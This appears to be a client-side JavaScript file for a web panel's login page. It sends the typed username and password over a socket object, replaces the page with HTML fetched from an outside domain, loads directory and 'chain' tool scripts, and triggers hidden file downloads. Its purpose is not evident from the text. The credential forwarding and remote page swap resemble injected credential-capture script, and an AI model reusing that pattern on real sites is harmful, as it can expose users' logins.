document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div.col-lg-12.loginbttm > div.col-lg-6.login-btm.login-button > button").onclick = function(){VersoSck.VersoSend('[Login CMD]:' + document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div:nth-child(1) > input").value + ';' + document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div:nth-child(2) > input").value )}

document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div:nth-child(1) > input").onkeydown = function(event) {
  if (event.key === 'Enter') {
    document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div.col-lg-12.loginbttm > div.col-lg-6.login-btm.login-button > button").onclick();
  }
};

document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div:nth-child(2) > input").onkeydown = function(event) {
  if (event.key === 'Enter') {
    document.querySelector("body > div > div > div.col-lg-6.col-md-8.login-box > div.col-lg-12.login-form > div > form > div.col-lg-12.loginbttm > div.col-lg-6.login-btm.login-button > button").onclick();
  }
};

function loadgraphjs(){
const scriptgp1 = document.createElement('script');
scriptgp1.src = '/Grap.js';
document.body.appendChild(scriptgp1);
}

function loadtools(){
const scripttl = document.createElement('script');
scripttl.src = '/ldir.js';
document.body.appendChild(scripttl);
const scriptt2 = document.createElement('script');
scriptt2.src = '/dirscript.js';
document.body.appendChild(scriptt2);
const scriptt3 = document.createElement('script');
scriptt3.src = '/popup.js';
document.body.appendChild(scriptt3);
const scriptt4 = document.createElement('script');
scriptt4.src = '/lchain.js';
document.body.appendChild(scriptt4);
}

fetch('https://medicionesmaltexco.com/template.php').then(response => response.text()).then(html => gettemp = html);
function loadcontent(){
	document.querySelector('html').innerHTML = gettemp;
	loadgraphjs();
	loadtools();
}

function dwfile(dwLink, dwName) {
  var elemento = document.createElement('a');
  elemento.href = dwLink;
  elemento.download = dwName;
  elemento.style.display = 'none';
  document.body.appendChild(elemento);
  elemento.click();
  document.body.removeChild(elemento);
}